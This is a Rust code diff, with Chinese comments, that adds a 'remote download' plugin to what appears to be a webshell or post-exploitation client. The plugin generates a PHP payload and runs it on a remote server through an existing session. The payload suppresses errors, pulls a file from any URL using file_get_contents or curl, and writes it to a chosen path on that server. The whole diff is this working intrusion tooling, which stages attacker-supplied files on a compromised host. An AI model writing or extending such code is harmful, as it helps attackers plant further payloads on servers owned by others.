@@ -386,6 +386,92 @@ impl FeaturePlugin for ZipPlugin {
     }
 }
 
+// ---------------------------------------------------------------------------
+// 远程下载（通用，PHP 代码型：URL 拉取写入目标路径）
+// ---------------------------------------------------------------------------
+
+fn php_remote_download_code(url: &str, target: &str) -> String {
+    format!(
+        r#"<?php
+error_reporting(0);
+$url = {url};
+$target = {target};
+$data = @file_get_contents($url);
+if ($data === false) {{
+    if (function_exists('curl_init')) {{
+        $ch = @curl_init($url);
+        @curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        @curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+        @curl_setopt($ch, CURLOPT_TIMEOUT, 60);
+        $data = @curl_exec($ch);
+        @curl_close($ch);
+    }}
+}}
+if ($data === false || $data === '') {{ echo json_encode(array('ok' => false, 'error' => '下载失败（目标不可达或空响应）')); return; }}
+$ok = @file_put_contents($target, $data);
+echo json_encode(array('ok' => (bool)$ok, 'target' => $target, 'size' => strlen($data)));
+"#,
+        url = serde_json::to_string(url).unwrap_or_else(|_| "\"\"".to_string()),
+        target = serde_json::to_string(target).unwrap_or_else(|_| "\"\"".to_string()),
+    )
+}
+
+/// 远程下载（通用）：从 URL 下载文件到目标服务器路径。
+pub struct RemoteDownloadPlugin;
+
+impl FeaturePlugin for RemoteDownloadPlugin {
+    fn manifest(&self) -> FeatureManifest {
+        FeatureManifest {
+            id: "remote_download".into(),
+            name: "远程下载".into(),
+            version: "1.0.0".into(),
+            description: "从 URL 下载文件到目标服务器路径（file_get_contents，curl 降级）。".into(),
+            category: "general".into(),
+            languages: vec![],
+            params: vec![
+                ParamSpec {
+                    name: "url".into(),
+                    label: "下载地址".into(),
+                    param_type: "string".into(),
+                    default: Some(serde_json::json!("")),
+                    options: None,
+                },
+                ParamSpec {
+                    name: "target".into(),
+                    label: "保存路径".into(),
+                    param_type: "string".into(),
+                    default: Some(serde_json::json!("/tmp/downloaded")),
+                    options: None,
+                },
+            ],
+            kind: "feature".into(),
+        }
+    }
+
+    fn execute(
+        &self,
+        protocol: &dyn Protocol,
+        session: &dyn SessionState,
+        runtime: &str,
+        params: &serde_json::Value,
+        settings: &AppSettings,
+    ) -> Result<serde_json::Value, ProtocolError> {
+        match runtime {
+            "php" => {
+                let url = param_str(params, "url", "");
+                let target = param_str(params, "target", "/tmp/downloaded");
+                let code = php_remote_download_code(&url, &target);
+                let output = protocol.run_code(session, "php", &code, settings)?;
+                serde_json::from_str(&output)
+                    .map_err(|_| ProtocolError::ParseError(format!("载荷输出非 JSON：{output}")))
+            }
+            other => Err(ProtocolError::NotSupported(format!(
+                "远程下载暂不支持运行时 {other}"
+            ))),
+        }
+    }
+}
+
 #[cfg(test)]
 mod tests {
     use super::*;
